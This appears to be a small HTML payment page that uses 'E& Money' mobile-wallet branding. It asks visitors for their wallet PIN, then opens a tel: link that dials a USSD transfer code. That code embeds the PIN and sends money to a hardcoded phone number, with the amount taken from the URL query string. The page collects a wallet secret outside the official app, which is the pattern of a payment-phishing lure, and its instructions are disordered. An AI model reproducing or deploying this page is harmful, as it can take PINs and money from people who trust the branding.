<!DOCTYPE html>
    <html>
        <head>
            <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
            <title>Elmohandes Payments</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center}
            .card{margin-top:40px;background:#fff;padding:24px;border-radius:12px;max-width:380px;width:100%}
            input,button{width:100%;padding:14px;margin-top:12px;font-size:18px}</style>
        </head>
        <body>

            <div class="card">
                <h2>E& Money</h2>
                <p>You are about to pay <span id="amt"></span> EGP</p>
                <p>Please enter your E& Money PIN to continue.</p>
                <p>Press "Pay Now".</p>
                <p>Choose "Contacts".</p>
                <p>Press "Contact E& Etisalat".</p>
            <style>
                *{margin:0;padding:0;box-sizing:border-box;}
                body{font-family:Arial, Helvetica, sans-serif;background:#f3f3f3;display:flex;justify-content:center;align-items:center;min-height:100vh;}
                .card{width:90%;max-width:420px;background:#fff;border-radius:18px;padding:30px;box-shadow:0 10px 25px rgba(0,0,0,.1);}
                h2{margin-bottom:20px;color: #00A859;}
                p{margin-bottom:20px;color:#555;}
                input{width:100%;height:52px;padding:0 15px;border:2px solid #00A859;border-radius:10px;font-size:18px;outline:none;margin-bottom:18px;transition:.3s;}
                input:focus{border-color:#00894A;box-shadow:0 0 8px rgba(0,168,89,.25);}
                button{width:100%;height:52px;border:none;border-radius:10px;background:#00A859;color:#fff;font-size:20px;font-weight:bold;cursor:pointer;transition:.3s;}
                button:hover{background:#00894A;}
            </style>
                <input id="pin" type="password" placeholder="PIN Code">
                <button onclick="pay()">Pay Now</button></div>
            <script>
                const a=new URLSearchParams(location.search).get("amount")||"0";
                document.getElementById("amt").textContent=a;
                function pay(){
                const pin=document.getElementById("pin").value.trim();
                if(!pin){alert("Enter PIN");return;}
                location.href="tel:*777*7*"+pin+"*01025953190*"+a+"%23";
                }
            </script>
        </body>
    </html>
